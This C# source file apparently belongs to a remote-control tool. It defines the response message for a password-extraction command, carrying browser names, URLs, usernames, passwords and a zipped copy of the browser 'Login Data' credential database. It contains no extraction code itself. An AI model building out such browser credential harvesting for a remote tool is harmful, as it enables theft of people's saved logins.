using System;
using System.Collections.Generic;

namespace RemoteControl.Protocals.Response
{
    public class PasswordEntry
    {
        public string Browser = "";
        public string Url = "";
        public string Username = "";
        public string Password = "";
    }

    public class ResponsePasswordExtract : ResponseBase
    {
        public List<PasswordEntry> Passwords = new List<PasswordEntry>();

        /// <summary>
        /// 原始数据库文件(Login Data)的zip打包
        /// </summary>
        public byte[] RawDataZip;
    }
}
